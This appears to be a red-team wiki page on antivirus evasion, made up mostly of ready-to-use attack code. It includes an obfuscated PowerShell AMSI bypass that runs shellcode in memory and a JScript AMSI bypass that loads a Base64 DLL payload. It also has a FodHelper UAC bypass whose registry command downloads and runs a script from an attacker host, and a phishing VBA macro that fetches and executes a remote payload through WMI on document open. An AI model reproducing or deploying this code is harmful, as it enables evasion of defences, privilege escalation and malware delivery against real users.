---
title: Antivirus evasion
tags:
  - breach
  - operations
  - antivirus
  - evasion
  - reflective
  - powershell
  - vba
  - jscript
  - javascript
  - amsi
  - wmi
---

## Bypassing AMSI in PowerShell

The Microsoft
[Antimalware Scan Interface (AMSI)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
is software loaded into the context of your **PowerShell** terminal to detect if
malicious behavior or software is being executed. Fortunately for us, even with
an unprivileged user, we can modify the memory of our process to disable checks
implemented by AMSI. Below is a PowerShell script that will disable AMSI for the
current process and then reflectively load shellcode into an unmanaged memory
segment and execute it.

```powershell
function Find-Func {
    Param(
        [Parameter(Mandatory = $true)]
        [String]
        $ModuleName,

        [Parameter(Mandatory = $true)]
        [String]
        $FunctionName
    )

    $assembly = ([AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object {
                $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')
            }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $methods = @()

    $assembly.GetMethods() | ForEach-Object { if ($_.Name -eq "GetProcAddress") { $methods += $_ } }

    return $methods[0].Invoke($null, @(($assembly.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function Get-Guid {
    return [System.Guid]::NewGuid().Guid
}

function Get-DelegateType {
    Param(
        [Parameter(Mandatory = $true)]
        [Type[]]
        $FunctionParameters,

        [Parameter(Mandatory = $true)]
        [Type]
        $FunctionReturnType
    )

    # Define dynamic, in-memory assembly for code exeuction
    $DelegateTypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        $(New-Object System.Reflection.AssemblyName((Get-Guid))),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(
            'InMemoryModule',
            $false).DefineType(
                (Get-Guid),
                'Class, Public, Sealed, AnsiClass, AutoClass',
                [System.MulticastDelegate])

    # Define WinExec constructor and parameters
    $DelegateTypeBuilder.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $FunctionParameters).SetImplementationFlags('Runtime, Managed')

    # Define invoke method for delegate
    $DelegateTypeBuilder.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $FunctionReturnType,
        $FunctionParameters).SetImplementationFlags('Runtime, Managed')

    return $DelegateTypeBuilder.CreateType()
}

[Ref].Assembly.GetType('Syst'+'em.Manag'+'ement.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)

# Call VirtualAlloc to get new segment
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Find-Func -ModuleName "kernel32.dll" -FunctionName "VirtualAlloc"),
    (Get-DelegateType `
        -FunctionParameters @([IntPtr], [UInt32], [UInt32], [UInt32]) `
        -FunctionReturnType ([IntPtr]))).Invoke(
            [IntPtr]::Zero,
            0x1000,
            0x3000,
            0x40
    )

# Define shellcode
[Byte[]] $buf = ${INSERT_SHELLCODE_HERE}

# Copy shellcode into new segment
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# Call CreateThread to execute new segment
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Find-Func -ModuleName "kernel32.dll" -FunctionName "CreateThread"),
    (Get-DelegateType `
        -FunctionParameters @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) `
        -FunctionReturnType ([IntPtr]))).Invoke(
            [IntPtr]::Zero,
            0,
            $lpMem,
            [IntPtr]::Zero,
            0,
            [IntPtr]::Zero
    )

# Call WaitForSingleObject to wait until thread exits
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Find-Func -ModuleName "kernel32.dll" -FunctionName "WaitForSingleObject"),
    (Get-DelegateType `
        -FunctionParameters @([IntPtr], [Int32]) `
        -FunctionReturnType ([Int]))).Invoke(
            $hThread,
            0xffffffff
    )
```

## Bypassing AMSI in Jscript

The following Jscript script bypasses AMSI and reflectively loads a Base64
encoded DLL payload into process memory, invoking **Pwn.Kernel32** method from
the DLL to gain code execution:

```javascript
var sh = new ActiveXObject("WScript.Shell");
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try {
  var ae = sh.RegRead(key);
  if (ae != 0) {
    throw new Error(1, "");
  }
} catch (e) {
  sh.RegWrite(key, 0, "REG_DWORD");
  sh.Run(
    "cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " +
      WScript.ScriptFullName,
    0,
    1,
  );
  sh.RegWrite(key, 1, "REG_DWORD");
  WScript.Quit(1);
}
function setversion() {
  new ActiveXObject("WScript.Shell").Environment("Process")("COMPLUS_Version") = "v4.0.30319";
}
function debug(s) {}
function base64ToStream(b) {
  var enc = new ActiveXObject("System.Text.ASCIIEncoding");
  var length = enc.GetByteCount_2(b);
  var ba = enc.GetBytes_4(b);
  var transform = new ActiveXObject(
    "System.Security.Cryptography.FromBase64Transform",
  );
  ba = transform.TransformFinalBlock(ba, 0, length);
  var ms = new ActiveXObject("System.IO.MemoryStream");
  ms.Write(ba, 0, (length / 4) * 3);
  ms.Position = 0;
  return ms;
}

var serialized_obj = ${INSERT_BASE64_ENCODED_DLL_PAYLOAD};
var entry_class = "Pwn.Kernel32";

try {
  setversion();
  var stm = base64ToStream(serialized_obj);
  var fmt = new ActiveXObject(
    "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter",
  );
  var al = new ActiveXObject("System.Collections.ArrayList");
  var d = fmt.Deserialize_2(stm);
  al.Add(undefined);
  var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
} catch (e) {
  debug(e.message);
}
```

## Bypassing UAC with FodHelper

Administrative users restricted by
[User Account Control (UAC)](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)
require interactive consent by the user to execute privileged actions. This can
be pretty frustrating if we're trying to privesc as an administrative user via
the cmdline, meterpreter session, or some other non-interactive means.

The
[fodhelper.exe](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_fodhelper/)
application allows us to execute arbitrary commands by modifying a registry key
and then invoking the application. This will be executed with administrative
privileges, and bypasses UAC. Below is a PowerShell script that demonstrates
this:

```powershell
$lHost = ${LHOST}
$lPort = ${LPORT}

New-Item `
    -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Value "powershell (New-Object System.Net.WebClient).DownloadString('http://${lHost}:${lPort}/Payload.ps1') | Invoke-Expression" `
    -Force

New-ItemProperty `
    -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" `
    -PropertyType String `
    -Force

Start-Process -FilePath "C:\Windows\System32\fodhelper.exe"

```

## Invoking PowerShell with WMI in VBA

Phishing users and executing **Visual Basic for Applications (VBA)** inside of
Microsoft Office documents can sometimes block or alert on attempts to invoke
**cmd.exe** directly. Alternatively, we can use **Windows Management Interface
(WMI)** to invoke our PowerShell payloads after downloading them remotely. Below
is an example VBA payload to download our payload and execute it with WMI:

```vba
Sub MyMacro()
    Dim str As String
    strArg = "powershell (New-Object System.Net.WebClient).DownloadString('http://${LHOST}:${LPORT}/Payload.ps1') | Invoke-Expression"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Related pages

- [[executing-win32-apis-in-powershell|Executing Win32 APIs in PowerShell]]
